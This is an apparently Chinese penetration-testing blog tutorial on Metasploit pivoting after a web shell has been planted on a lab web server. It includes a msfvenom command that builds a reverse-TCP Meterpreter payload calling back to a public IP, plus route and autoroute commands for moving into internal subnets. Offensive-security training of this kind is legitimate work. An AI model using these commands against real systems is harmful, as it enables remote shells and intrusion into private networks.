**目录**



[反弹MSF类型的Shell](#t0 "反弹MSF类型的Shell")



[添加内网路由](#t1 "添加内网路由")



* * *



MSF的跳板功能是MSF框架中自带的一个路由转发功能，其实现过程就是MSF框架在已经获取的Meterpreter Shell的基础上添加一条去往“[内网](https://so.csdn.net/so/search?q=%E5%86%85%E7%BD%91&spm=1001.2101.3001.7020)”的路由，直接使用MSF去访问原本不能直接访问的内网资源，只要路由可达了那么我们就可以使用MSF来进行探测了。



我们现在有下面这个环境：



Web服务器通过[端口映射](https://so.csdn.net/so/search?q=%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84&spm=1001.2101.3001.7020)，对外提供Web服务。Web服务器上有两张网卡，内网分别还有其他两台服务器，一台开放了http服务，一台开放了SMB服务。拓扑图如下：



![](https://img-blog.csdnimg.cn/20190617173911841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



### 反弹MSF类型的Shell



我们通过web渗透，成功往Web服务器上上传了一句话木马，成功用菜刀连接。



然后我们现在想获得一个MSF类型的Shell。



我们先生成一个木马文件



```
msfvenom -p windows/meterpreter/reverse_tcp lhost=112.74.89.58 lport=42906 -f exe -o test.exe
```




![](https://img-blog.csdnimg.cn/20190617160840759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



用菜刀上传到Web服务器上，然后执行我们的木马程序，Kali成功获得反弹的MSF类型的shell。



![](https://img-blog.csdnimg.cn/20190617160935747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



### 添加内网路由



然后我们现在想要继续渗透内网。



我们先获取目标内网相关信息，可以看到该主机上的网卡有两个网段。



```
run get_local_subnets
```




![](https://img-blog.csdnimg.cn/20190617161042275.png)



如果我们不添加这两个网段路由的话，是探测不到这两个网段其他主机的。



以下是手动添加到达192.168.11.0和192.168.12.0的路由



```
#在全局给指定的session增删路由      
route add 192.168.11.0  255.255.255.0  1     #在session1中添加到达192.168.11.0网段的路由      
route add 192.168.12.0  255.255.255.0  1     #在session1中添加到达192.168.12.0网段的路由      
route add 0.0.0.0       0.0.0.0        1     #在session1中添加到达0.0.0.0/24网段的路由      
route del 192.168.12.0  255.255.255.0  2     #在session2中删除到达192.168.12.0网段的路由      
route print    #打印路由信息       
#也可以在进入session下添加路由      
run autoroute -s 192.168.11.0/24             #添加到达192.168.11.0网段的路由      1
run autoroute -s 192.168.12.0/24             #添加到达192.168.12.0网段的路由      1
run autoroute -s 0.0.0.0/0                   #添加到达0.0.0.0/0的路由      1
run autoroute -p                             #打印路由信息
```




![](https://img-blog.csdnimg.cn/20190617173514402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



以下是添加路由前后探测的对比信息。



![](https://img-blog.csdnimg.cn/20190617173605412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



![](https://img-blog.csdnimg.cn/20190617173645641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)



**注意：在实际的内网渗透中，我们可以直接添加到 0.0.0.0/0 的路由。这样，只要该被控主机可达的地址就都可达！**



 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")



![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)



参考文章：[使用Metasploit进行路由转发](https://www.jianshu.com/p/9eb48aba3fe0 "使用Metasploit进行路由转发")



                  [Metasploit路由转发实现内网渗透](https://www.freebuf.com/column/194400.html "Metasploit路由转发实现内网渗透")



相关文章：[后渗透阶段之基于MSF的内网主机探测](https://blog.csdn.net/qq_36119192/article/details/92556219 "后渗透阶段之基于MSF的内网主机探测")